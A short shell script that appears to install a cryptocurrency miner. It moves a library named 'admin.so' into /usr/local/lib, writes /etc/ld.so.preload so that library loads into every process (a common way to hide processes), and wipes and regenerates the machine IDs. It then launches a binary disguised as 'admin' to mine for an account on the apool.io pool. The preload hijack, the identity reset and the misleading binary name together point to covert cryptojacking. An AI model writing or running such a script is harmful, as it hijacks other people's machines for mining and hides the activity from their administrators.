mv admin.so /usr/local/lib/admin.so
mv ld.so.preload /etc/ld.so.preload
sleep 5
rm -rf /etc/machine-id
rm -rf /var/lib/dbus/machine-id
dbus-uuidgen --ensure
systemd-machine-id-setup
cat /etc/machine-id
sleep 2
./admin --algo ore --account CP_3wf3t9wmft --pool ore1.hk.apool.io:9092 --gpu-off
